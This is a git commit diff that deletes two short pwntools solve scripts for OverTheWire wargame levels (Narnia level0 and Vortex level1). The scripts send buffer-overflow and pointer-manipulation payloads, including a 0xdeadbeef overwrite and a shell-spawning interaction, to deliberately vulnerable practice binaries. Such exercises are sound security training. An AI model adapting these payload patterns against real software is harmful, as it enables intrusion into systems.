8cc7f6250d2d83498af9bd6f4d95c92579a492b4
azorfus <72391760+azorfus@users.noreply.github.com>
2024-09-14 13:31:48 +0530

    Delete resources directory

--- resources/overthewire.org/narnia/level0/solve.py
+++
@@ -1,6 +0,0 @@
-from pwn import *
-
-target = process("./narnia0")
-print(target.recv())
-target.send('A'*20 + "\xef\xbe\xad\xde\n")
-print(target.recv())
--- resources/overthewire.org/vortex/level1/solve.py
+++
@@ -1,5 +0,0 @@
-from pwn import * 
-
-target = process("/vortex/vortex1")
-target.send(261*"\\" + "\xca")
-target.interactive()
